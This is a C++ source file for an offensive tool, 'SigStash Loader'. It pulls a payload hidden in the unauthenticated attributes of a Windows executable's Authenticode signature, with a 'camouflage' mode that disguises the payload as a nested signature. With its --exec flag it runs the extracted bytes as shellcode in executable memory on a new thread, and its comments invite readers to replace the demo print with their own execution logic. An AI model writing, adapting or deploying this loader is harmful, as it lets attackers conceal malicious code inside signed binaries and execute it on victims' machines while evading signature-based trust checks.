/*
 * SigStash Loader — Demo extraction stub
 *
 * Reads its own (or a target) PE file, parses the PKCS#7 signature,
 * and extracts the embedded payload from unauthenticated attributes.
 * Supports both direct OID and camouflage (SPC_NESTED_SIGNATURE) mode.
 *
 * This is a DEMO — it prints the payload. Replace the print with your
 * own logic (VirtualAlloc + memcpy + CreateThread, etc.)
 *
 * Build:
 *   x86_64-w64-mingw32-g++ -std=c++17 -O2 -o SigStashLoader.exe loader.cpp
 *
 * Usage:
 *   SigStashLoader.exe <carrier.exe> [--camouflage] [--oid OID] [--exec]
 */

#include "../TrustMeBro/pkcs7_embed.h"

#include <cstdio>
#include <cstring>

#ifdef _WIN32
#include <windows.h>
#endif

void print_hex(const uint8_t* data, size_t len, size_t max_display = 64) {
    size_t show = len < max_display ? len : max_display;
    for (size_t i = 0; i < show; i++)
        std::printf("%02x", data[i]);
    if (len > max_display)
        std::printf("... (%zu more bytes)", len - max_display);
    std::printf("\n");
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::fprintf(stderr,
            "SigStash Loader — Extract payload from Authenticode signature\n\n"
            "Usage: %s <signed_pe> [options]\n"
            "Options:\n"
            "  --camouflage   Extract from SPC_NESTED_SIGNATURE wrapper\n"
            "  --oid <OID>    Custom OID (default: 1.3.6.1.4.1.311.99.1)\n"
            "  --exec         Execute payload as shellcode (Windows only)\n"
            "\nSelf-extract: %s %s\n", argv[0], argv[0], argv[0]);
        return 1;
    }

    const char* pe_path = argv[1];
    bool camouflage = false;
    bool exec_mode = false;
    std::string oid = "1.3.6.1.4.1.311.99.1";

    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "--camouflage") == 0) camouflage = true;
        else if (strcmp(argv[i], "--exec") == 0) exec_mode = true;
        else if (strcmp(argv[i], "--oid") == 0 && i + 1 < argc) oid = argv[++i];
    }

    // Read PE
    std::ifstream f(pe_path, std::ios::binary);
    if (!f) { std::fprintf(stderr, "[-] Cannot open %s\n", pe_path); return 1; }
    std::vector<uint8_t> pe((std::istreambuf_iterator<char>(f)), {});
    f.close();

    // Parse PE cert
    pkcs7::PECert ci;
    if (!pkcs7::pe_cert_info(pe.data(), pe.size(), ci) || ci.rva == 0 || ci.size == 0) {
        std::fprintf(stderr, "[-] No signature found in %s\n", pe_path); return 1;
    }

    const uint8_t* p7; size_t p7len;
    if (!pkcs7::pe_pkcs7(pe.data(), pe.size(), ci, p7, p7len)) {
        std::fprintf(stderr, "[-] Invalid PKCS#7 structure\n"); return 1;
    }

    // Navigate to unsignedAttrs
    pkcs7::PKCS7Nav nav;
    if (!pkcs7::navigate(p7, p7len, nav) || !nav.has_unauth) {
        std::fprintf(stderr, "[-] No unauthenticated attributes\n"); return 1;
    }

    // Find our attribute
    std::string use_oid = camouflage ? "1.3.6.1.4.1.311.2.4.1" : oid;
    auto target = pkcs7::encode_oid_value(use_oid);
    std::vector<uint8_t> payload;

    for (auto& a : pkcs7::parse_children(p7, p7len, nav.ua_co, nav.ua_co + nav.ua_cl)) {
        if (a.tag != 0x30) continue;
        auto kids = pkcs7::parse_children(p7, p7len, a.content_offset, a.content_offset + a.content_length);
        if (kids.size() < 2 || !pkcs7::oid_matches(p7, p7len, kids[0].pos, target)) continue;
        if (kids[1].tag != 0x31) continue;

        auto vals = pkcs7::parse_children(p7, p7len, kids[1].content_offset,
                                          kids[1].content_offset + kids[1].content_length);
        if (vals.empty()) continue;

        if (camouflage) {
            auto nested = pkcs7::slice(p7, vals[0].pos, vals[0].total());
            payload = pkcs7::unwrap_nested(nested.data(), nested.size());
        } else {
            if (vals[0].tag == 0x04)
                payload = pkcs7::slice(p7, vals[0].content_offset, vals[0].content_length);
            else
                payload = pkcs7::slice(p7, vals[0].pos, vals[0].total());
        }
        break;
    }

    if (payload.empty()) {
        std::fprintf(stderr, "[-] No payload found (OID: %s, camouflage: %s)\n",
                     use_oid.c_str(), camouflage ? "yes" : "no");
        return 1;
    }

    std::printf("[+] Extracted %zu bytes from %s\n", payload.size(), pe_path);
    std::printf("[*] OID: %s | Mode: %s\n", use_oid.c_str(), camouflage ? "camouflage" : "direct");
    std::printf("[*] Payload: ");
    print_hex(payload.data(), payload.size());

#ifdef _WIN32
    if (exec_mode) {
        std::printf("[!] Executing payload as shellcode...\n");
        void* mem = VirtualAlloc(NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!mem) { std::fprintf(stderr, "[-] VirtualAlloc failed\n"); return 1; }
        memcpy(mem, payload.data(), payload.size());
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
        if (!hThread) { std::fprintf(stderr, "[-] CreateThread failed\n"); return 1; }
        WaitForSingleObject(hThread, INFINITE);
    }
#else
    if (exec_mode) {
        std::fprintf(stderr, "[!] --exec only supported on Windows\n");
        return 1;
    }
#endif

    return 0;
}
